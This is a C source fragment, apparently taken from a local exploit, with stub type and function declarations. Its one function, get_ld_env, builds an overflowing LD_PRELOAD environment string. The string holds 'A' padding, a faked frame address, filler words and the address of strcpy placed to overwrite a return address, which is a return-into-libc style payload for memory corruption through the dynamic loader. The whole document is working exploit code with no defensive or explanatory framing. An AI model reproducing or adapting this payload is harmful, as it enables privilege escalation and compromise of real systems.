
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 long FRAME_ADDR ;
 int FRAME_SIZE ;
 int free (char*) ;
 unsigned long get_strcpy_addr () ;
 scalar_t__ malloc (int) ;
 int memset (char*,char,int) ;
 int perror (char*) ;
 int printf (char*,unsigned long) ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;

char * get_ld_env(int buf_len, long offset)
{
  long *lp;
  char *buf;
  char *ld_pre_env;
  unsigned long strcpy_ret;

  strcpy_ret = get_strcpy_addr();
  if(!strcpy_ret)
    return 0;
  else
    printf("strcpy found at [0x%x]\n\n", strcpy_ret);
  buf = (char *)malloc(buf_len + FRAME_SIZE + 1 + 1);
  if(!buf)
  {
    perror("malloc");
    return 0;
  }


  memset(buf, 'A', buf_len);
  buf[0] = '/';
  lp = (long *)(buf + 1124);
  *lp++ = FRAME_ADDR + offset;

  lp = (long *)(buf + buf_len);





  *lp++ = 0x61616161;
  *lp++ = 0x62626262;
  *lp++ = 0x63636363;
  *lp++ = 0x64646464;
  *lp++ = 0x65656565;
  *lp++ = 0x66666666;
  *lp++ = 0x67676767;
  *lp++ = 0x68686868;


  *lp++ = 0x69696969;
  *lp++ = 0x70707070;
  *lp++ = 0x71717171;
  *lp++ = 0x72727272;
  *lp++ = 0x73737373;
  *lp++ = 0x74747474;
  *lp++ = FRAME_ADDR + offset;
  *lp = strcpy_ret;
  strcat(buf, "/");



  ld_pre_env = (char *)malloc(strlen(buf) + strlen("LD_PRELOAD=") + 1);
  if(!ld_pre_env)
  {
    perror("malloc");
    return 0;
  }

  strcpy(ld_pre_env, "LD_PRELOAD=");
  strcat(ld_pre_env + strlen(ld_pre_env), buf);

  free(buf);

  return ld_pre_env;
}
